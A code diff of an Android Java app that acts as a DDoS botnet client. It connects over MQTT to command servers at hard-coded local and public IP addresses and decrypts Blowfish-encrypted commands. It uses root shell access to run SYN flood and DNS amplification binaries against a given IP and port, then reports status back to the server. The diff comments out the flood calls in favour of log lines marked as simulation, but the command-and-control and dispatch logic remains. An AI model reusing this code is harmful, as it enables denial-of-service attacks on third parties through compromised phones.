@@ -71,30 +71,32 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
 
             final String[] str = {""};
             final StringBuffer sb =  new StringBuffer();
+            String id = MqttApplication.sharedPreferences.getString("ID","-");
+            id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
+            //id = "19e46b97-80b6-45f3-838e-785f69102a96"; //SIMULACIÓN
+            int firstTime = 0; //SIMULACIÓN
+            Blowfish blowfish = new Blowfish();
+            ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
+            final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
 
             try
             {
 
                    if(this.DoS == 1){
-                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
+                       /*Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                        BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        while((str[0] = inputStream.readLine())!= null){
                            sb.append(str[0]);
-                       }
-                       String consulta = sb.toString();
-                       byte[] bytes = consulta.getBytes();
-                       MqttMessage mqttMessage = new MqttMessage(bytes);
-                       this.clientSyn.publish("CyC", mqttMessage);
+                       }*/
+                       Log.d("DDoS", "run: >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>SYN");
+
                    }else if (this.DoS == 2){
-                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
+                       /*Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                        BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        while((str[0] = inputStream.readLine())!= null){
                            sb.append(str[0]);
-                       }
-                       String consulta = sb.toString();
-                       byte[] bytes = consulta.getBytes();
-                       MqttMessage mqttMessage = new MqttMessage(bytes);
-                       this.clientSyn.publish("CyC", mqttMessage);
+                       }*/
+                       Log.d("DDoS", "run: >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>AMP/DNS");
                    }
 
             } catch (Exception e) {
@@ -108,9 +110,6 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
                 t.interrupt();
 
                 String errorMessage = "Error (3): Sin acceso como SU.";
-                String id = MqttApplication.sharedPreferences.getString("ID","-");
-                id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
-                int firstTime = 0; //SIMULACIÓN
                 String deviceInfo = "";
                 if(this.DoS == 1){
                     deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
@@ -119,10 +118,6 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
                 }
 
                 //Cifrando
-                Blowfish blowfish = new Blowfish();
-                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-                final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
-
                 try {
                     bytesMqtt.write(encryptKey.getBytes());
                     bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
@@ -225,7 +220,7 @@ public class MqttConnectionManagerService extends Service {
 
         client = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://192.168.1.78:1883",
                 clientId);
-        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.132.150:1883",
+        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.100.198:1883",
                 clientId2); //SIMULACIÓN <-------------
 
         final String id = MqttApplication.sharedPreferences.getString("ID", "-");
@@ -246,7 +241,6 @@ public class MqttConnectionManagerService extends Service {
                     Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);
 
                     String s = String.valueOf(message);
-                    Log.d(TAG, "IRA WE->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +s);
                     //Descifrando el mensaje
 
                     String decryptionKey = s.substring(0, 4);
@@ -263,24 +257,12 @@ public class MqttConnectionManagerService extends Service {
                     }
                     byte[] decrypted = new byte[0];
                     byte[] finalBytes = new BigInteger(encryptedPayload, 16).toByteArray();
-                    Log.d(TAG, "messageArrived: Longitud del carro: "+finalBytes.length);
 
                     if(finalBytes.length % 8 != 0){
-                        Log.d(TAG, "messageArrived: Entro AL PRIMER IF");
                         if(finalBytes[0] == 0){
-                            Log.d(TAG, "messageArrived: Entro al SEGUNDO IF");
-                            Log.d(TAG, "messageArrived: "+bytesToHex(finalBytes));
-                            //System.arraycopy(finalBytes, 1, finalBytes, 0, finalBytes.length-1);
                             finalBytes = Arrays.copyOfRange(finalBytes,1,finalBytes.length);
-                            //finalBytes = new byte[0];
-                            //finalBytes = aux;
-                            Log.d(TAG, "messageArrived:Cambiado gambito  "+bytesToHex(finalBytes));
                         }
                     }
-
-                    Log.d(TAG, "Cadena convertida en bytes: "+new String(finalBytes));
-                    Log.d(TAG, "Cadena convertida en bytes (en crudo): "+finalBytes);
-                    Log.d(TAG, "messageArrived: "+bytesToHex(finalBytes));
 
                     try {
                         decrypted = cipher.doFinal(finalBytes);
@@ -289,10 +271,10 @@ public class MqttConnectionManagerService extends Service {
                     }
 
                     String decryptedString = new String(decrypted);
-                    Log.d(TAG, "DESCIFRADO->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +decryptedString);
 
                     //Leyendo el JSON
-                    JSONObject obj = new JSONObject(decryptedString);
+                    String jsonString = decryptedString.substring(0, decryptedString.lastIndexOf("&"));
+                    JSONObject obj = new JSONObject(jsonString);
                     decryptedString = obj.getString("command");
 
                     final String[] splited = decryptedString.split("\\s+");
@@ -300,6 +282,7 @@ public class MqttConnectionManagerService extends Service {
                     final StringBuffer sb = new StringBuffer();
                     final String[] str = {""};
 
+                    //String id = "19e46b97-80b6-45f3-838e-785f69102a96"; //SIMULACIÓN
                     String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
                     int firstTime = 0; //SIMULACIÓN
                     final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
@@ -337,6 +320,30 @@ public class MqttConnectionManagerService extends Service {
 
                             } catch (Exception e) {
                                 e.printStackTrace();
+                                //Sin acceso como su
+                                String errorMessage = "Error (3): Sin acceso como SU.";
+                                String deviceInfo = "";
+                                deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"1\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
+
+                                //Cifrando
+                                Blowfish blowfish = new Blowfish();
+                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
+
+                                try {
+                                    bytesMqtt.write(encryptKey.getBytes());
+                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
+                                } catch (Exception ex) {
+                                    ex.printStackTrace();
+                                }
+
+                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
+
+                                try {
+                                    client2.publish("CyC",mqttMessage);
+                                } catch (MqttException ex) {
+                                    ex.printStackTrace();
+                                }
+
                             }
                             break;
 
@@ -598,8 +605,6 @@ public class MqttConnectionManagerService extends Service {
                             la inundación SYN.*/
                              if(!busyThread && !dosFloodSyn){
 
-                                 t1 = new MyThread(splited[1],splited[2],1,client2);
-
                                  String floodSyn = "Iniciada";
                                  String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
 
@@ -627,6 +632,8 @@ public class MqttConnectionManagerService extends Service {
 
                                  MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", true);
                                  MqttApplication.editor.apply();
+
+                                 t1 = new MyThread(splited[1],splited[2],1,client2);
 
                              }else if (busyThread){
 
